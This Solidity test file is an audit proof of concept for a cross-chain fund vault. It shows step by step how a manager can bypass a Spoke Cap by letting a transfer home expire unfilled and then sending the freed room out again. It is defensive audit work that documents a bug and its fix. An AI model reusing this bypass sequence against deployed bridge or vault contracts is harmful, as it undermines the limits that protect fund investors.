// SPDX-License-Identifier: MIT
pragma solidity 0.8.28;

import {ICoreVault} from "../../../src/interfaces/ICoreVault.sol";
import {BridgeQuote, TransferKind} from "../../../src/interfaces/FundTypes.sol";
import {CrossChainFixture} from "./helpers/CrossChainFixture.sol";
import {SecAcrossSpokePool} from "./helpers/SecAcrossSpokePool.sol";

/// @title PoC: an expired transfer home leaves the Spoke Cap's return leg before its refund, so the cap is exceeded
/// @notice Finding (medium), raised while verifying the discounted-mint finding (same root cause, distinct impact).
///         Lens: cross-chain messaging and bridging.
///
/// Root cause: `SpokeCrossChainLib._stillInFlight` drops a hub-bound transit from `inFlightToHub` once
/// `fillDeadline + maxReportAge` has passed (presumed filled, OQ-09 stance). `CoreVaultLogic.spokeCapUsage` counts the
/// return leg (DEC-066 B1) only from the latest report's `inFlightToHub`, so from that report on the transfer counts
/// neither as spoke value (debited at the send) nor as the return leg, until the Across refund lands (55 to 90 min after
/// the deadline from Robinhood, docs/DECISIONS.md) and a report built after `recognizeRefund` is accepted. The Spoke Cap
/// is checked only on send (DEC-095), so principal sent in that window stays on the spoke on top of the refund.
///
/// Attack (the manager, inside the Mandate):
/// 1. With the Spoke Cap full, `SpokeVault.sendToHub(400,000 USDG, Principal, quote)` that nobody fills: a zero-fee
///    quote (`outputAmount == amount` passes `_checkQuote`, no relayer fills below the Across LP fee) or, as here, the
///    manager's own relayer named exclusive until the fill deadline (`exclusivityDeadline` is forwarded unchecked).
/// 2. After `fillDeadline + maxReportAge` a report drops the transit: `spokeCapUsage` shows 400,000 USDC of room.
/// 3. `CoreVault.sendToSpoke(400,000 USDC)` passes the cap check and the fill lands on the spoke.
/// 4. The refund lands in the escrow; anyone calls `recognizeRefund` and `report()`: the spoke holds 899,550 USDG of
///    fund principal against a 500,000 USDC cap, and nothing ever checks it again.
///
/// Impact: the Mandate's Spoke Cap (DEC-031, DEC-037, DEC-095) is not enforced against the manager; no direct loss
/// (Share Assets are whole once the refund is recognized). Same fix as the discounted-mint finding: keep a hub-bound
/// transit in a value base, and in the return leg the cap counts, until its outcome is known on the hub.
contract ExpiredSendHomeCapBypassPoC is CrossChainFixture {
    uint256 internal constant CAP = 500_000e6;
    address internal managerRelayer = makeAddr("managerRelayer");

    function _spokeCap() internal pure override returns (uint256) {
        return CAP;
    }

    function test_POC_expiredSendHomeReleasesTheSpokeCap() public {
        // Alice funds the fund; the manager fills the Spoke Cap; a report confirms the arrival.
        _deposit(alice, 1_000_000e6);
        (, uint256 outboundDeposit) = _sendToSpoke(CAP, 499_750e6);
        _fillOnSpoke(outboundDeposit);
        _reportAndDeliver(900);
        (uint256 spokeValue,, uint256 inFlightToHub, uint256 cap) = core.spokeCapUsage(0);
        assertEq(cap, CAP);
        assertEq(spokeValue, 499_750e6, "the cap is full");

        // 1. A transfer home that nobody fills (the manager's own relayer is exclusive until the fill deadline).
        BridgeQuote memory quote = BridgeQuote({
            outputAmount: 399_800e6,
            quoteTimestamp: uint32(block.timestamp),
            exclusivityDeadline: FILL_DEADLINE,
            exclusiveRelayer: managerRelayer
        });
        (bytes32 homeTransit, uint256 homeDeposit) = _sendToHub(400_000e6, TransferKind.Principal, quote);
        SecAcrossSpokePool.Deposit memory d = spokePool.deposit(homeDeposit);

        // While the transit is listed the return leg holds the cap (DEC-066 B1): a further send reverts.
        _reportAndDeliver(900);
        (spokeValue,, inFlightToHub,) = core.spokeCapUsage(0);
        assertEq(spokeValue + inFlightToHub, 499_550e6, "spoke 99,750 + return leg 399,800");
        vm.prank(manager);
        vm.expectPartialRevert(ICoreVault.SpokeCapExceeded.selector);
        core.sendToSpoke(0, 1000e6, 0, _quote(1000e6));

        // 2. fillDeadline + maxReportAge passes: the spoke presumes the transit filled and stops listing it.
        vm.warp(uint256(d.fillDeadline) + MAX_REPORT_AGE + 1);
        _reportAndDeliver(900);
        (spokeValue,, inFlightToHub,) = core.spokeCapUsage(0);
        assertEq(spokeValue, 99_750e6);
        assertEq(inFlightToHub, 0, "the unfilled transfer counts nowhere");

        // 3. The manager sends the freed room to the spoke; the fill lands.
        (, uint256 secondDeposit) = _sendToSpoke(400_000e6, 399_800e6);
        _fillOnSpoke(secondDeposit);

        // 4. The refund lands; anyone recognizes it and reports.
        skip(45 minutes);
        vm.chainId(SPOKE);
        spokePool.refundExpired(homeDeposit);
        spoke.recognizeRefund(homeTransit);
        assertEq(spoke.unallocatedBalance(address(usdg)), 899_550e6, "499,750 + 399,800 arrived + 400,000 refunded");
        vm.chainId(HUB);
        _reportAndDeliver(900);

        // The spoke holds 899,550 USDG of fund principal against a 500,000 USDC cap, and Share Assets are whole.
        (spokeValue,, inFlightToHub, cap) = core.spokeCapUsage(0);
        assertEq(inFlightToHub, 0);
        assertGt(spokeValue, cap + 399_000e6, "the Spoke Cap is exceeded by the whole transfer");
        assertEq(core.shareAssets(), 997_500e6 - 250e6 - 200e6, "no loss beyond the two bridge fees");
    }
}
